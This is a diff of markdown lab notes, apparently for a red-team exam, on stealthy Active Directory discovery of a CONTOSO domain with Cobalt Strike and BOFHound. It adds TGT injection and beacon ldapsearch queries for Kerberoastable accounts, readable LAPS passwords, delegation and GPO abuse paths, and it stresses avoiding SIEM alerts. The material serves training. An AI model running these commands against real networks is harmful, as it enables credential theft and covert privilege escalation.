@@ -2,6 +2,34 @@
 
 >The objective of this lab is to carry out discovery of the CONTOSO domain.  By the end, you will be able to collect data and map attack paths in BloodHound, in a more stealth OPSEC-🟢SAFE way than using the default collectors that will be detected.
 
+## Auth Check
+
+>Establish proper Kerberos token before running ldapsearch, inject a TGT OPSEC-🟢SAFE  
+
+```cs
+kerberos_ticket_use C:\path\to\rsteel.kirbi
+ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
+```
+
+## Domain-Level Privesc Paths OPSEC-🟢SAFE
+
+```cs
+// GPO abuse — find GPOs applied to current machine/user OUs where we can write
+beacon> ldapsearch (&(objectClass=groupPolicyContainer)) --attributes displayName,gPCFileSysPath,ntsecuritydescriptor
+
+// Kerberoastable accounts (SPN holders) — weak password = privesc path
+beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName,memberOf
+
+// LAPS — find computers where current user can read ms-Mcs-AdmPwd
+beacon> ldapsearch (&(objectClass=computer)(ms-Mcs-AdmPwd=*)) --attributes name,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
+
+// AdminSDHolder protected accounts (SDProp targets — ACL abuse paths)
+beacon> ldapsearch (&(adminCount=1)(objectClass=user)) --attributes samAccountName,memberOf,ntsecuritydescriptor
+
+// Delegation misconfig — unconstrained delegation (TGT theft risk)
+beacon> ldapsearch (&(samAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes name,userAccountControl,msDS-AllowedToDelegateTo
+```
+
 ## BOFHound
 
 1. Launch Cobalt Strike and connect to the team server.
@@ -92,60 +120,6 @@ BloodHound will now show that rsteel has local administrative privileges on WKST
 
 ---
 
-## Exam-Day Recon Automation — Aggressor Script
-
-Instead of copy-pasting each ldapsearch command individually, create a single `.cna` file
-that fires all queries with one beacon command. Load once at exam start.
-
-**File:** `C:\Users\Attacker\Desktop\exam-recon.cna`
-
-```java
-alias domain_recon {
-    binput($1, "ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor");
-    binput($1, "ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor");
-    binput($1, "ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl");
-    binput($1, "ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl");
-    binput($1, "ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity");
-    binput($1, "ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName");
-    binput($1, "ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName");
-    binput($1, "ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf");
-    binput($1, "ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description");
-    binput($1, "ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd");
-    binput($1, "ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName");
-}
-```
-
-**Load at exam start:**
-```
-CS → Cobalt Strike → Script Manager → Load → C:\Users\Attacker\Desktop\exam-recon.cna
-```
-
-**Fire from any beacon — two aliases, run in order:**
-```cs
-beacon> domain_recon_bulk       // BOFHound 🧠 data — run immediately on first beacon
-// check SIEM if available — confirm no alerts before continuing
-beacon> domain_recon_targeted   // sensitive queries — run after bulk confirms no alerts
-```
-
-Queries queue at the beacon's sleep interval — with `sleep 3 20` set, 11 queries spread over ~40 seconds naturally. The OPSEC risk is **what you query**, not how fast:
-
-| Alias | Queries | Risk |
-|-------|---------|------|
-| `domain_recon_bulk` | domain/OU/GPO + all objects + trusts | 🟢LOW — looks like domain sync |
-| `domain_recon_targeted` | LAPS, delegation, AS-REP, SPNs, descriptions | 🟠MEDIUM — known recon signatures in Elastic rules |
-
-⚠️ **Aggressor alias chaining — use `fireAlias`, not direct calls or `binput`:**
-```java
-fireAlias($1, "ldapsearch", "(filter) --attributes x,y");  // CORRECT — dispatches to alias table
-ldapsearch($1, "(filter) --attributes x,y");               // FAILS — ldapsearch is alias not sub
-binput($1, "ldapsearch (filter) --attributes x,y");        // FAILS — display only, no execution
-```
-- `ldapsearch` is registered as an **alias** by `SA.cna`, not a **sub** — calling it as a function throws `non-existent function &ldapsearch`
-- `binput` only echoes text to the beacon console display — no task is sent to the beacon
-- `fireAlias($bid, "aliasname", "arg string")` dispatches into the CS alias command table — confirmed working
-
----
-
 ## Additional ldapsearch Queries — Exam-Day Privilege Path Finding
 
 The two Step 3 queries feed BOFHound 🧠 BloodHound and give the full domain picture.
@@ -202,22 +176,6 @@ beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDi
 // trustAttributes: 32=WITHIN_FOREST (parent-child), 8=FOREST_TRANSITIVE (cross-forest)
 ```
 
-### Exam-Day Query Priority Order
-
-Run in this sequence immediately after first beacon — before BloodHound is ready:
-
-| Priority | Query | Why |
-|----------|-------|-----|
-| 1 | Combined users+groups+computers (`samAccountType` filter) | Full AD picture for BOFHound🧠 |
-| 2 | Domain/OU/GPO (`objectClass` filter) | BloodHound path data |
-| 3 | Unconstrained delegation | Fastest path to DA if any non-DC has it |
-| 4 | Kerberoastable accounts | Avoid honeypots (check SPN before roasting) |
-| 5 | AdminCount=1 users | Identify all privileged accounts |
-| 6 | AS-REP roastable | No-auth hash grab |
-| 7 | LAPS readable | Free local admin password |
-| 8 | Descriptions with passwords | Quick win if poorly configured |
-| 9 | Trust enumeration | Cross-domain/forest paths |
-
 ---
 
 ## OPSEC Warnings & Exam-Day Notes
@@ -234,28 +192,12 @@ Binding to 10.10.120.1
 retrieved 0 results total
 ```
 
-**Fix — establish a proper Kerberos token before running ldapsearch:**
-
-```cs
-// Option 1 — make_token with known creds (OPSEC-🟠CAUTION — Event 4648)
-beacon> make_token CONTOSO\rsteel <password>
-beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
-
-// Option 2 — inject a TGT (OPSEC-🟢SAFE — no new logon event)
-beacon> kerberos_ticket_use C:\path\to\rsteel.kirbi
-beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
-```
-
-> This affects **any** beacon that arrived via WinRM, SCShell, or WMI — all produce
-> non-forwardable network logon tokens. Only beacons from interactive sessions or `make_token`
-> / `kerberos_ticket_use` have usable Kerberos context for LDAP queries.
-
 ---
 
-### `net computers` — Never Use
+### ⛔net computers⛔Never Use⛔
 
-`net computers` (and all `net *` beacon commands) run via the `shell` built-in which spawns
-`cmd.exe` — OPSEC-🔴UNSAFE. It also fails with Error 5 from a network logon token.
+`net computers` ⛔ `net *` beacon commands run via the `shell` built-in which spawns
+`cmd.exe` — OPSEC-🔴UNSAFE. ⛔ fails with Error 5 from a network logon token.
 
 | Command | OPSEC | Replacement |
 |---------|-------|-------------|
